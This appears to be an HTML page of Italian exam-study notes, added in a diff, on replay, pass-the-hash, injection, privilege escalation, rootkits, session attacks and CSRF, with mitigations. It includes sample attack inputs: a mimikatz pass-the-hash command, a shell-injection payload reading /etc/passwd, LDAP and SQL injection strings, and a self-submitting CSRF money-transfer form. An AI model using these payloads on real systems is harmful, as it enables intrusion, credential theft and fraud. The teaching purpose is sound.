+      <br><strong>• Pass-the-Hash (PTH)</strong>: Variante in ambiente Microsoft Active Directory / Windows in cui l'attaccante ruba l'hash di una password utente (es. l'hash NTLM tipicamente memorizzato e prelevato dalla RAM del processo LSASS) e lo trasmette direttamente al servizio di autenticazione per aprire sessioni remote, aggirando del tutto l'inserimento o la conoscenza della password della vittima in chiaro.
+      <br><strong>• Pass-the-Ticket (PTT)</strong>: Variante focalizzata sul protocollo Kerberos in AD, in cui l'aggressore esfiltra dalla memoria o dal traffico i ticket di sessione (come TGT - Ticket Granting Ticket o TGS - Ticket Granting Service, compresi i celebri Golden Ticket o Silver Ticket) e li ripresenta direttamente ai controller di dominio o ai server di risorsa per conseguire permessi amministrativi istantanei senza subire sfide di verifica.
+    </dd>
+  </dl>
+
+  <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">Le Contromisure Cruciali e Mitigazioni</h4>
+  <p>
+    Senza specifiche difese logiche, qualunque applicativo web o sistema operativo è vulnerabile ad attacchi di replay. Le mitigazioni standard del settore includono:
+  </p>
+  <ul style="margin-left: 20px; line-height: 1.6; margin-bottom: 20px;">
+    <li><strong>Cryptographic Nonces (Numeri Monouso)</strong>: Un <em>nonce</em> è un valore causale numerico ad elevata entropia generato dal server per ogni singola transazione e valido una sola volta. Il client deve calcolare la sua firma o inviare la risposta includendo tale nonce. Il server tiene traccia dei nonce consumati: se un attaccante ripresenta una transazione contenente un nonce già utilizzato in precedenza, la richiesta viene respinta sul colpo come tentativo di replay.</li>
+    <li><strong>Timestamps (Marcatori Temporali) e Sincronizzazione Oraria</strong>: L'applicazione incorpora in ogni richiesta la data e l'ora corrente dell'invio. Il server controlla la validità temporale del pacchetto: se l'intervallo trascorso è superiore a un delta ridottissimo (es. 5 secondi sul web o massimo 5 minuti in Kerberos mediante sincronizzazione dei clock NTP), il pacchetto è reputato scaduto e viene rifiutato.</li>
+    <li><strong>Sequence Numbers (Numeri di Sequenza)</strong>: L'impiego di una sequenza numerica coordinata e sequenziale (es. nel protocollo TCP con i numeri di sequenza, o in IPSec) costringe client e server a concordare che ogni messaggio successivo debba incrementare il valore numerico di un'unità. I messaggi duplicati o vecchi fuori ordine vengono identificati dal motore e scartati.</li>
+    <li><strong>Canale Sicuro via TLS/HTTPS</strong>: L'impiego universale della cifratura a livello di trasporto TLS (HTTPS) costituisce la prima barriera assoluta sul Web per sbarrare la strada all'intercettazione on-path passiva (sniffing) dei token di sessione o delle chiavi API in transito, impedendo all'attaccante di prelevare i messaggi di base utili per preparare il replay.</li>
+  </ul>
+
+  <p>
+    Il comando <code>mimikatz sekurlsa::pth /ntlm:B4B9B02E...</code> è
+    il tool più famoso per il pass-the-hash: estrae gli hash NTLM dalla memoria LSASS
+    di Windows e li usa per aprire nuove sessioni autenticate senza conoscere la password.
+  </p>
+
+  <div class="exam-tip" style="margin-bottom: 25px;">
+    <strong>EXAM TIP — Pass-the-hash: riconosci mimikatz</strong><br>
+    Se vedi <code>mimikatz</code> o <code>sekurlsa::pth</code> o <code>/ntlm:</code>
+    in un comando → <strong>pass-the-hash attack</strong>.
+    Mimikatz è lo strumento standard per il dump degli hash NTLM e il loro riuso per credential replay.
+    Non è social engineering, non è fileless malware.
+  </div>
+</section>
+
+
+<!-- ══ ATTACCHI APPLICATIVI ══════════════════════════════════════ -->
+<section id="app-attacks">
+  <h2>Attacchi applicativi (Application Attacks)</h2>
+
+  <h3 id="injection">Injection (Iniezione) ed Evasione del Controllo Input</h3>
+  <p>
+    La classe degli <strong>Injection Attacks (Attacchi di Iniezione)</strong> raggruppa una delle minacce più critiche per la sicurezza del software. Si verifica ogni volta che un'applicazione accetta dati forniti da fonti esterne non fidate (input dell'utente) e li inoltra a un interprete logico o a un parser sotto forma di istruzione o query senza un'adeguata validazione o sanitizzazione. 
+    L'interprete commette l'errore fondamentale di confondere i <em>dati</em> con il <em>codice</em>, finendo per eseguire comandi arbitrati incorporati dall'attaccante.
+  </p>
+
+  <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">Tipologie Principali di Injection Applicativo</h4>
+  <p>
+    A seconda dei canali e dei motori bersaglio aggrediti dall'utente malintenzionato, l'injection si suddivide in famiglie distinte:
+  </p>
+  <dl class="termlist" style="margin-left: 10px; margin-bottom: 25px;">
+    <dt>Command Injection (Iniezione di Comandi di Sistema)</dt>
+    <dd>
+      Consiste nell'inserire comandi arbitrari del sistema operativo host (Windows CMD, PowerShell o Linux Bash Shell) all'interno di un'applicazione web o server-side che non convalida i parametri passati alle funzioni di runtime che avviano processi esterni.
+      <br><strong>• Il Meccanismo Tecnico</strong>: Se un'applicazione accetta un indirizzo IP in un form per fare un ping di rete a livello di sistema operativo chiamando internamente <code>system("ping " + user_input)</code>, un attaccante potrebbe inviare come input: <code>8.8.8.8; cat /etc/passwd</code> (su Linux) oppure <code>8.8.8.8 &amp; dir</code> (su Windows). L'interprete di shell riconosce i metacaratteri separatori (come <code>;</code>, <code>&amp;</code>, <code>&amp;&amp;</code>, <code>|</code> o backticks <code>`</code>) ed esegue in sequenza il ping legittimo seguito immediatamente dal comando nocivo inserito dall'attaccante sul server host.
+    </dd>
+
+    <dt>Lightweight Directory Access Protocol (LDAP)</dt>
+    <dd>
+      <strong>LDAP</strong> è il protocollo client-server standard aperto utilizzato per interrogare, autenticare e gestire database di gerarchie centralizzate (servizi directory come Active Directory o OpenLDAP) d'identità, utenze e risorse. Le interrogazioni LDAP fanno uso di una sintassi basata su filtri parentetici logici (es. <code>(cn=nomeutente)</code>).
+    </dd>
+
+    <dt>LDAP Injection (Iniezione su Servizi Directory)</dt>
+    <dd>
+      Analogamente a una SQL injection sui database relazionali, l'<strong>LDAP Injection</strong> si verifica quando gli input degli utenti vengono inseriti direttamente all'interno delle stringhe di filtro utilizzate per interrogare le directory LDAP, consentendo all'attaccante di deviare la logica dell'interrogazione originaria.
+      <br><strong>• Il Meccanismo Tecnico</strong>: Sfruttando la vulnerabilità mediante caratteri speciali logici (specificamente parentesi tonde <code>(</code> <code>)</code>, l'asterisco jolly <code>*</code>, e gli operatori logici booleani <code>&amp;</code>, <code>|</code>, <code>!</code>), l'attaccante può estrarre elenchi protetti di utenti, ricavare attributi riservati o aggirare completamente la fase di autenticazione. Ad esempio, se la query di login LDAP è costruita in formato non sicuro come <code>(&amp;(user=USER)(pass=PASSWORD))</code>, immettendo come nome utente la stringa <code>admin)(|(&amp;</code>, la query finale diventerà: <code>(&amp;(user=admin)(|(&amp;)(pass=PASSWORD))</code>. Poiché l'operatore logico OR (<code>|</code>) riceve un parametro sempre verificato sul lato sinistro, l'interprete convaliderà l'autenticazione ignorando completamente la necessità di una password corretta.
+    </dd>
+
+    <dt>SQL Injection (SQLi) e XML/XPath Injection</dt>
+    <dd>
+      La SQL Injection manipola i database relazionali mediante alterazione sintattica delle query SQL (es: <code>' OR 1=1 --</code>), mentre l'XML/XPath Injection agisce contro lettori XML scompaginando la struttura gerarchica ad albero dei dati scritti o interrogati.
+    </dd>
+  </dl>
+
+  <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">Le Difese Architetturali: Validazione vs Sanitizzazione dell'Input</h4>
+  <p>
+    La mitigazione principale, universale e invalicabile contro qualsiasi forma di attacco di injection si basa sulla corretta gestione dell'input. Esiste una differenza procedurale critica tra queste due azioni difensive:
+  </p>
+  <dl class="termlist" style="margin-left: 10px; margin-bottom: 25px;">
+    <dt>Input Validation (Validazione dell'Input)</dt>
+    <dd>
+      Rappresenta la <strong>prima linea di difesa assoluta</strong>. È una misura proattiva che verifica se l'input fornito dall'utente rispetta i criteri rigorosi di formato e struttura attesi prima che la stringa venga inoltrata o elaborata.
+      <br>• <strong>Come si applica</strong>: Si basa sulla definizione di restrizioni severe (come espressioni regolari, tipi di dato esatti, vincoli di lunghezza e intervalli numerici). Preferisce sempre le **whitelist (lista di caratteri consentiti)** rispetto alle blacklist. Se l'input contiene caratteri non conformi o tenta di introdurre codici non previsti, l'applicazione interrompe immediatamente l'esecuzione e <strong>respinge</strong> in toto la richiesta dell'utente.
+    </dd>
+
+    <dt>Input Sanitization (Sanitizzazione dell'Input)</dt>
+    <dd>
+      Interviene modificando attivamente il testo di input anomalo prima che venga memorizzato o processato dal codice applicativo, rendendolo innocuo per gli interpreti logici interni.
+      <br>• <strong>Come si applica</strong>: Si suddivide in due logiche principali: l'<strong>encoding / escaping (codifica)</strong>, che sostituisce i caratteri sensibili (es: trasformare <code>'</code> in <code>&amp;apos;</code> o <code>&lt;</code> in <code>&amp;lt;</code>) in modo che vengano interpretati dal motore finale come semplici caratteri letterali visivi anziché istruzioni sintattiche; e il **filtro / stripping**, che rimuove o depura chirurgicamente porzioni di testo non desiderate (es: eliminare il tag <code>&lt;script&gt;</code> dall'input).
+    </dd>
+
+    <dt>Parametrizzazione (Prepared Statements)</dt>
+    <dd>
+      Per le interrogazioni a database (SQL), la parametrizzazione rappresenta lo standard d'oro in quanto costringe l'interprete del database a considerare l'input solo ed esclusivamente come un parametro letterale immodificabile, svuotando del tutto i metacaratteri di qualunque influenza sintattica.
+    </dd>
+  </dl>
+
+  <div class="example-box">
+    <strong>Esempio — Data exfiltration via DNS tunneling</strong><br>
+    Il PCAP mostra traffico da 10.5.1.1 verso 52.165.16.154 usando encapsulation IPv6
+    in IPv4 (proto 41) su una porta non standard (13788). Dati sensibili vengono
+    esfiltrati incapsulando IPv6 dentro IPv4 per nascondere il traffico malevolo in
+    quello apparentemente legittimo. L'indicatore: protocollo di encapsulation usato
+    su porte non standard verso IP esterni sospetti.
+  </div>
+
+  <h3 id="priv-esc">Attacchi di Escalation e Gestione dei Privilegi</h3>
+  <p>
+    Una volta stabilita la testa di ponte su un computer o una rete aziendale, gli autori delle minacce mirano a espandere la propria rete d'azione. Gli <strong>Escalation Attacks (Attacchi di Escalation)</strong> costituiscono l'insieme di tattiche e vettori offensivi mirati ad aggirare i controlli logici di sicurezza al fine di acquisire diritti operativi superiori e muoversi liberamente nell'infrastruttura.
+  </p>
+
+  <h4 style="color: var(--navy); margin-top: 20px; margin-bottom: 5px;">1. Privilege Escalation (Local, Web e Logica)</h4>
+  <p>
+    La <strong>Privilege Escalation (Scalata / Escalation dei Privilegi)</strong> consiste nello sfruttamento di bug del software, configurazioni fallaci a livello di sistema operativo o debolezze procedurali del codice per elevare i poteri di esecuzione di un'utenza oltre i limiti prescritti. Si manifesta in due principali direttrici macroscopiche:
+  </p>
+  <dl class="termlist" style="margin-left: 10px; margin-bottom: 25px;">
+    <dt>Vertical Privilege Escalation (Escalation dei Privilegi Verticale)</dt>
+    <dd>
+      L'attaccante sale di grado lungo la piramide gerarchica dei permessi, spostandosi da un account a basso privilegio ad un profilo con poteri di massima amministrazione (es. da utente standard a <strong>Root</strong> su sistemi Unix/Linux o <strong>System/Administrator</strong> su Microsoft Windows).
+      <br><strong>• Esempio Semplice di Scenario Reale:</strong> Su un server Linux aziendale, un utente standard scopre che un'applicazione di backup di sistema è stata marchiata con il bit speciale <code>SUID</code> (Set Owner User ID upon Execution), il che significa che l'applicazione viene eseguita con i privileges del suo proprietario (in questo caso, l'amministratore Root). Se l'applicazione di backup permette di invocare comandi esterni senza opportuna validazione, l'utente standard può digitare comandi non autorizzati e forzare l'applicazione SUID a lanciare una shell interattiva di comando: quest'ultima si avvierà con i pieni privilegi di Root, realizzando l'escalation verticale istantanea.
+    </dd>
+
+    <dt>Horizontal Privilege Escalation (Escalation dei Privilegi Orizzontale)</dt>
+    <dd>
+      L'attaccante acquisisce i permessi logici di un utente avente lo stesso identico livello di privilegi originari, ma associato a risorse, dati o cartelle private diverse (es. l'utente Alice accede illecitamente alla corrispondenza riservata dell'utente Bob).
+      <br><strong>• Esempio Semplice di Scenario Reale:</strong> All'interno di un portale di home banking o di conservazione di documenti medici, l'utente autenticato viene indirizzato a un URL strutturato in questo modo:
+      <br><code>https://banca.it/estratto_conto.php?account_id=7410</code>
+      <br>Se l'applicazione è affetta da una vulnerabilità logica di tipo IDOR (Insecure Direct Object Reference) e non verifica se l'utenza correntemente loggata possiede realmente i diritti per visualizzare la risorsa richiesta, l'utente può semplicemente modificare a mano il parametro nell'URL in <code>account_id=7411</code>. Di conseguenza riceverà l'estratto conto riservato di un altro cliente, compiendo un'escalation orizzontale.
+    </dd>
+    <dt>Mitigazione principale</dt>
+    <dd>Applicazione ferrea del principio del minimo privilegio (Principle of Least Privilege), rimozione sistematica del bit SUID non necessario su file eseguibili, esecuzione automatizzata di patch di sicurezza per sanare falle del kernel locale, e implementazione di controlli di accesso granulari e validazione lato server per impedire vulnerabilità IDOR tramite controllo di sessione ad ogni chiamata.</dd>
+  </dl>
+
+  <h4 style="color: var(--navy); margin-top: 20px; margin-bottom: 5px;">2. I Livelli Operativi della CPU: User Mode vs Kernel Mode</h4>
+  <p>
+    Per governare la stabilità di un computer moderno e scongiurare che programmi malfunzionanti (o virus) possano distruggere il filesystem o l'hardware, i processori standard (CPU) ed i sistemi operativi sono architettati dividendone il funzionamento in anelli o strati di privilegio logici distinti (Execution Rings):
+  </p>
+  <dl class="termlist" style="margin-left: 10px; margin-bottom: 25px;">
+    <dt>User Mode (Modalità Utente / Spazio Utente - Ring 3)</dt>
+    <dd>
+      È la modalità protetta a basso privilegio in cui vengono eseguite le comuni applicazioni utilizzate dagli utenti (es. browser Web, fogli di calcolo, client email, database applicativo). In <strong>User Mode</strong>, il software opera in un ambiente isolato ed ha un set di istruzioni CPU limitato: non può accedere direttamente alla memoria fisica complessiva, ai registri dei chip e all'allineamento dell'hardware della scheda madre. Per compiere qualsiasi operazione d'ingresso/uscita (come visualizzare un pixel a schermo, inviare un pacchetto web o scrivere un file sul disco), l'applicazione deve farne esplicita richiesta al sistema operativo tramite <strong>System Call (System Calls)</strong>, che provvede ad autenticare e mediare l'operazione. Se un programma in User Mode crasha, si interrompe solo il singolo processo autonomo, senza compromettere la macchina.
+    </dd>
+
+    <dt>Kernel Mode (Modalità Kernel / Spazio Privilegiato - Ring 0)</dt>
+    <dd>
+      È l'area a privilegi massimi ed assoluti del processore in cui risiede il nocciolo duro (<strong>Kernel</strong>) del sistema operativo ed i software driver dedicati al dialogo diretto con i circuiti hardware fisici. In <strong>Kernel Mode</strong> la CPU non subisce alcuna restrizione: ha libero accesso all'intera memoria virtuale e fisica di sistema e gestisce direttamente la CPU, le schede video, i dischi fissi e le interfacce di rete. Qualsiasi errore, puntatore impazzito o falla logica a livello Kernel provoca l'immediata destabilizzazione o l'interruzione irreversibile dell'intera macchina (manifestandosi con la famigerata schermata Blu di Windows - BSOD, o con un Kernel Panic sui sistemi Unix/Linux).
+    </dd>
+  </dl>
+
+  <div class="exam-tip" style="margin-bottom: 25px;">
+    <strong>EXAM TIP — I traguardi del Privilege Escalation d'Infrastruttura</strong><br>
+    Un attacco di privilege escalation locale (es: exploit Dirty COW) mira esattamente a sfruttare una debolezza logica per indurre il sistema a transitare ed eseguire codice ostile proveniente dall'ambiente <strong>User Mode (bassi privilegi, Ring 3)</strong> direttamente all'interno della blindata <strong>Kernel Mode (massimi privilegi, Ring 0)</strong>, azzerando istantaneamente l'efficacia di qualunque controllo di sicurezza locale applicato sul sistema operativo.
+  </div>
+
+  <h4 style="color: var(--navy); margin-top: 20px; margin-bottom: 5px;">3. Rootkits a Confronto: User Mode vs Kernel Mode Rootkits</h4>
+  <p>
+    I <strong>Rootkit</strong> sono famiglie di malware progettate specificamente per nascondere tracce della propria presenza o di altri virus (es. backdoor, trojan, minatori di moneta) modificando il normale funzionamento del sistema ospite. Essi si dividono in base allo strato architetturale su cui agiscono:
+  </p>
+  <dl class="termlist" style="margin-left: 10px; margin-bottom: 25px;">
+    <dt>User Mode Rootkit (Rootkit in Modalità Utente)</dt>
+    <dd>
+      Lavorano interamente all'interno dello spazio Ring 3. Essi agiscono infettando o rimpiazzando librerie di sistema standard di uso comune (es. file <code>.dll</code> condivisi su Windows o file libreria <code>.so</code> su Linux) oppure modificando temporaneamente la tabella delle funzioni caricate in memoria RAM per un processo d'utente.
+      Si dicono rilevabili poiché lavorano entro le limitazioni della User Mode: strumenti diagnostici di ispezione profonda o rilevatori antimalware caricati ad alti privilegi possono identificare l'alterazione dei processi, i link interrotti o i file di libreria non coordinati.
+    </dd>
+
+    <dt>Kernel Mode Rootkit (Rootkit in Modalità Kernel)</dt>
+    <dd>
+      Costituiscono la forma di malware più pericolosa e invisibile. Si installano caricando moduli dannosi direttamente a livello Ring 0 (es. manipolando file Driver di sistema o sfruttando vulnerabilità kernel in applicazioni autorizzate, o inserendo moduli LKM su Linux).
+      Poiché operano nello strato di massimo privilegio della macchina (pariteticamente o al di sotto dei motori antivirus stessi), i <strong>Kernel Mode Rootkits</strong> modificano la radice stessa delle query e delle risposte del sistema operativo (tecniche come DKOM - Direct Kernel Object Manipulation). Se un amministratore chiede l'elenco dei processi in esecuzione o tenta di verificare se l'hash del file <code>cmd.exe</code> is originale, il Rootkit intercetta la richiesta ed altera preventivamente e dinamicamente i dati restituiti dal sistema alla console di amministrazione, occultandosi totalmente alla vista. L'unico indicatore affidabile della loro presenza per gli analisti di sicurezza è l'intervento di sistemi di <strong>File Integrity Monitoring (FIM)</strong> che evidenziano differenze nel checksum di archiviazione dei file di sistema (es: hash di <code>cmd.exe</code> non allineato pur in assenza di patch del sistema), oppure l'avvio della macchina tramite un ambiente operativo secondario e incontaminato (Offline/Boot Scanning).
+    </dd>
+  </dl>
+
+  <h3 id="session-mgmt">Gestione delle Sessioni (Session Management) e Attacchi d'Impersonazione</h3>
+  <p>
+    I protocolli di rete web come l'HTTP nascono come protocolli <em>stateless</em> (senza stato), ossia privi della capacità nativa di ricordare le azioni degli utenti tra una richiesta e l'altra. Per ovviare a questo e consentire una persistente <strong>web browser session (sessione di navigazione)</strong> nell'applicazione, i programmatori adottano una logica di orchestrazione definita <strong>Session Management (Gestione delle sessioni)</strong>.
+  </p>
+
+  <h4 style="color: var(--navy); margin-top: 20px; margin-bottom: 5px;">I Mattoni Fondamentali: Cookie, Session Token e Session Cookie</h4>
+  <p>
+    Poiché HTTP non mantiene lo stato (stateless), la sicurezza e la continuità dell'esperienza web degli utenti dipendono interamente dall'uso corretto dei token e dei cookie di sessione.
+  </p>
+
+  <dl class="termlist" style="margin-left: 10px; margin-bottom: 25px;">
+    <dt>Cookie (Cookie Generico)</dt>
+    <dd>
+      Piccolo file di testo contenente dati in formato chiave-valore, inviato dal server web e memorizzato localmente dal browser dell'utente. Ad ogni successiva richiesta HTTP verso lo stesso server, il browser allega automaticamente il cookie memorizzato, consentendo l'identificazione, il tracciamento e la personalizzazione dello stato dell'utente.
+    </dd>
+
+    <dt>Session Cookie (Cookie di Sessione)</dt>
+    <dd>
+      Un cookie temporaneo privo di una data di scadenza esplicita impostata. Viene <strong>memorizzato esclusivamente nella memoria RAM temporanea</strong> del browser e viene <strong>completamente cancellato non appena l'utente chiude il browser</strong> o termina la sessione di navigazione corrente. È specificamente designato per ospitare il <em>Session Token</em> e mantenere l'utente autenticato durante una singola sessione continuata.
+    </dd>
+
+    <dt>Persistent Cookie (Cookie Persistente / Tracciante)</dt>
+    <dd>
+      A differenza del session cookie, un <strong>Persistent Cookie</strong> è configurato esplicitamente con un attributo di scadenza (come <code>Expires</code> o <code>Max-Age</code>) fornito dal server. Viene <strong>scritto direttamente sulla memoria di archiviazione non volatile (disco fisso)</strong> della macchina client, consentendogli di <strong>sopravvivere alla chiusura della scheda o dell'intero browser</strong> e persino al riavvio del computer. Viene utilizzato per ricordare le impostazioni dell'utente (es. "Ricordami" al login, lingua selezionata, articoli nel carrello) o come cookie di terze parti per attività continuative di monitoraggio e web analytics del comportamento dell'utente nel tempo.
+    </dd>
+
+    <dt>Session Token (Token di Sessione)</dt>
+    <dd>
+      Una stringa alfanumerica univoca, temporanea ed altamente casuale generata dal server applicativo subito dopo il superamento delle credenziali di login (username e password). Il Session Token funge da <strong>"badge d'ingresso digitale temporaneo"</strong>: il client lo presenta ad ogni richiesta successiva anziché ritrasmettere continuamente la password reale dell'utente dell'account, riducendo drasticamente l'esposizione delle credenziali in chiaro sul web.
+      <br><strong>• Entropia e Casualità (CSPRNG)</strong>: Per prevenire la predizione, il token deve essere generato tramite algoritmi crittograficamente sicuri (CSPRNG), offrendo un'altissima entropia che rende impossibile indovinare il token successivo tramite brute-force o calcoli probabilistici.
+    </dd>
+  </dl>
+
+  <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">I 3 Flag di Sicurezza Indispensabili per i Session Cookie</h4>
+  <p>
+    Esporre un cookie di sessione senza gli opportuni attributi di sicurezza significa lasciare la sessione dell'utente esposta a furti immediati. Un amministratore o sviluppatore deve accertarsi della presenza di tre flag fondamentali:
+  </p>
+  <ul style="margin-left: 20px; line-height: 1.6; margin-bottom: 20px;">
+    <li><strong>HttpOnly</strong>: Impedisce tassativamente a script lato client (come JavaScript o VBScript) di accedere al contenuto del cookie. Questo flag neutralizza quasi totalmente i tentativi di furto di sessione tramite attacchi <strong>Cross-Site Scripting (XSS)</strong>: anche se un hacker inietta uno script maligno nella pagina web, l'istruzione <code>document.cookie</code> non sarà in grado di leggere o esfiltrare il session cookie marcato HttpOnly.</li>
+    <li><strong>Secure</strong>: Istruisce il browser web a trasmettere il cookie <strong>esclusivamente su connessioni cifrate HTTPS (SSL/TLS)</strong>. Impedisce che il cookie venga involontariamente trasmesso in chiaro se l'utente digita una richiesta HTTP non cifrata, azzerando il rischio di sniffing di rete da parte di attori on-path.</li>
+    <li><strong>SameSite</strong>: Controlla se il cookie debba essere inviato insieme a richieste originate da siti terzi esterni (Cross-Site), agendo come presidio critico contro attacchi di <strong>Cross-Site Request Forgery (CSRF)</strong>. Supporta tre valori:
+      <br><strong>• SameSite=Strict</strong>: Il cookie viene inviato solo se l'utente sta navigando attivamente all'interno del medesimo sito d'origine. Se segue un link esterno, il cookie non viene trasmesso.
+      <br><strong>• SameSite=Lax</strong> (Default moderno): Consente l'invio del cookie sulle navigazioni cross-site di tipo top-level sicure (es. cliccando su un link Standard per accedere), ma lo blocca per richieste effettuate in background (come caricamento di immagini esterne o sottomissioni POST silenti).
+      <br><strong>• SameSite=None</strong>: Il cookie viene inviato con tutte le richieste, sia interne che cross-site (richiede obbligatoriamente il flag <em>Secure</em> accoppiato).
+    </li>
+  </ul>
+
+  <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">Architetture dei Token: Stateful (Sessioni Classiche) vs Stateless (JWT / OAuth)</h4>
+  <p>
+    Esistono due modelli architetturali prevalenti per la gestione e la validazione dei Session Token:
+  </p>
+  <dl class="termlist" style="margin-left: 10px; margin-bottom: 25px;">
+    <dt>1. Stateful Session Tokens (Modello Tradizionale)</dt>
+    <dd>
+      Il token di sessione generato è solo un identificativo casuale vuoto (es: <code>session_id: xyz123</code>). Il server web deve memorizzare questo id in una base dati attiva sul backend (come un database relazionale, o una cache in-memory rapidissima come Redis). Ad ogni richiesta del client, il server confronta l'id ricevuto con i record in memoria per accertarsi che la sessione sia attiva e determinare a quale utente corrisponde.
+      <br><em>Vantaggio chiave</em>: Il server ha il controllo istantaneo e assoluto sulla sessione. Se un amministratore rileva un comportamento anomalo, può cancellare il token dal database di backend, revocando immediatamente la sessione dell'utente (logout forzato di sicurezza).
+    </dd>
+
+    <dt>2. Stateless Client-Side Tokens (JWT - JSON Web Tokens)</dt>
+    <dd>
+      Il token stesso custodisce tutti i dati rilevanti (es. nome utente, permessi, data di scadenza) sotto forma di payload JSON crittograficamente firmato (e talvolta cifrato) sul server. Quando il client fa una richiesta, presenta il JWT; il server verifica semplicemente la firma crittografica del token per accertarsi che sia integro e non alterato, senza interrogare alcun database di sessioni.
+      <br><em>Vantaggio chiave</em>: Scalabilità estrema per architetture a microservizi distribuite e API stateless.
+      <br><em>Svantaggio di sicurezza</em>: Essendo stateless, la revoca immediata di un token JWT prima della sua scadenza naturale è complessa e richiede l'impiego di liste di revoca nere temporanee (Blacklisting), poiché il server di per sé non mantiene memoria delle sessioni attive.
+    </dd>
+  </dl>
+
+  <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">Minacce alla Sessione: Hijacking, Prediction, Cookie Poisoning e Spoofing</h4>
+  <dl class="termlist" style="margin-left: 10px; margin-bottom: 20px;">
+    <dt>Session Hijacking (Dirottamento / Furto di Sessione)</dt>
+    <dd>L'attacco avviene quando l'hacker riesce a sottrarre direttamente un <strong>Session Token</strong> attivo di un utente legittimo. Questa esfiltrazione può verificarsi intercettando le comunicazioni di rete in transito (es. sniffing su reti Wi-Fi aperte non protette da cifratura HTTPS), rubando i cookie memorizzati sul browser della vittima tramite <strong>malicious code</strong> iniettato (XSS), o tramite malware installato localmente sulla macchina della vittima. Una volta ottenuto il token, l'hacker lo inietta nel proprio browser: il server, credendo che la richiesta provenga dall'utente originario, dà accesso immediato all'account.</dd>
+
+    <dt>Session Prediction (Predizione di Sessione)</dt>
+    <dd>Invece di rubare un token esistente, l'attaccante calcola preventivamente e indovina un Session Token valido. Questo accade se l'applicazione web soffre di scarsa <strong>Randomness</strong> (scarsa casualità/entropia) nella generazione dei token (ad esempio se i token vengono generati in modo incrementale o basandosi solo su timestamp prevedibili). L'hacker testa sistematicamente la sequenza predetta finché non ottiene la sessione di un altro utente.</dd>
+
+    <dt>Cookie Poisoning (Avvelenamento dei Cookie)</dt>
+    <dd>
+      Consiste nella <strong>manipolazione e alterazione non autorizzata</strong> del contenuto, dei parametri o dei flag di un cookie archiviato localmente sulla macchina dell'utente (o intercettato in rete) prima che questo venga inviato nuovamente al server.
+      <br><strong>• Il Vettore d'Attacco</strong>: Se lo sviluppatore commette l'errore di memorizzare informazioni critiche o privilegi direttamente all'interno del cookie in chiaro (es: <code>role=user</code>, <code>isAdmin=false</code> o <code>discount_code=10</code>) e si fida ciecamente delle richieste in arrivo (scarsa validazione dell'input), l'utente malintenzionato può modificare la stringa locale ("avvelenare" il cookie in <code>role=admin</code> o <code>discount_code=90</code>) per effettuare una escalation dei privilegi o abusare dell'applicazione.
+      <br><strong>• Mitigazione</strong>: I cookie non devono mai contenere dati sensibili modificabili in chiaro. Qualsiasi informazione critica inserita in un cookie deve essere firmata crittograficamente (es. HMAC) o cifrata lato server affinché qualsiasi tentativo di alterazione venga rilevato e invalidato istantaneamente dal backend, oppure la sessione deve rimanere interamente gestita sul server (stateful session) lasciando nel client solo un ID casuale privo di significato logico diretto.
+    </dd>
+
+    <dt>Spoofing Attack (Casi d'Identità Falsificata)</dt>
+    <dd>Sia l'hijacking, la prediction che il cookie poisoning sfociano in uno <strong>spoofing attack</strong> applicativo: l'attore malevolo camuffa la propria identità, le proprie sessioni o i propri permessi per apparire agli occhi del server come un'entità fidata o con privilegi superiori a quelli reali, ingannando i moduli di autorizzazione della piattaforma.</dd>
+  </dl>
+
+  <h3 id="forgery">Request Forgery (CSRF / SSRF): Falsificazione delle Richieste</h3>
+  <p>
+    Il <strong>Request Forgery (Falsificazione delle richieste)</strong> è una classe di vulnerabilità web in cui l'attaccante inganna un client o un server inducendoli a inoltrare involontariamente comandi sensibili o transazioni HTTP riservate a proprio nome verso altre destinazioni.
+  </p>
+
+  <dl class="termlist" style="margin-left: 10px; margin-bottom: 20px;">
+    <dt>1. CSRF / XSRF — Cross-Site Request Forgery (Falsificazione delle richieste tra siti)</dt>
+    <dd>
+      L'attacco <strong>CSRF</strong> (noto anche come XSRF) costringe il browser della vittima, che ha una <strong>web browser session</strong> attiva su un sito web autorizzato (il <em>trusted website</em>), a inviare richieste ed eseguire transazioni non volute a nome dell'utente. Ne è un esempio l'invio forzato di transazioni bancarie, il cambio dell'indirizzo email di recupero o l'acquisto di prodotti in background.
+      
+      <h5 style="color: var(--navy); margin-top: 10px; margin-bottom: 5px;">Come funziona il vettore d'attacco in background?</h5>
+      L'attaccante allestisce un sito trapulando sul web la vittima. All'interno di quel portale, inserisce tag nascosti di caricamento risorse (es. tag <code>&lt;img&gt;</code> che richiamano l'API del sito bersaglio) o moduli invisibili progettati per far scattare in background delle <strong>form submissions (sottomissioni di moduli)</strong> automatiche tramite JavaScript all'atto dell'apertura del sito:
+      <pre style="margin-top: 5px; margin-bottom: 5px;"><code>&lt;!-- Sottomissione silenziosa a insaputa del browser dell'utente --&gt;
+&lt;form action="https://banca-trusted.com/api/trasferisci" method="POST" id="csrfForm"&gt;
+  &lt;input type="hidden" name="importo" value="5000" /&gt;
+  &lt;input type="hidden" name="vettore_dest" value="hacker_account" /&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('csrfForm').submit();&lt;/script&gt;</code></pre>
+      Poiché il browser della vittima è correntemente autenticato su <code>banca-trusted.com</code>, quando esegue la sottomissione del modulo in background dal sito dell'attaccante, il browser web, per design intrinseco, allega automaticamente il <strong>Session Cookie</strong> della vittima. Il server riceve la richiesta con tanto di cookie e, ritenendola provata e legittima, esegue il trasferimento del denaro a nome della vittima.
+      
+      <h5 style="color: var(--navy); margin-top: 10px; margin-bottom: 5px;">Le 2 Mitigazioni Indispensabili per CSRF:</h5>
+      <ul style="margin-left: 20px; line-height: 1.6; margin-top: 5px;">
+        <li><strong>User-specific tokens (Token anti-CSRF)</strong>: La difesa d'elezione. Ogni volta che il server genera un form HTML per l'utente autenticato, vi inietta all'interno una stringa segreta, unica per l'utente e generata con un fortissimo livello di <strong>randomness</strong> (imprevedibilità crittografica). All'atto di qualsiasi ricezione di form o richiesta POST, il server verificherà la corrispondenza del token trasmesso con quello salvato in sessione. Un sito web esterno controllato da un attaccante non può indovinare né leggere questo token unico, neutralizzando completamente le form submissions clandestine.</li>
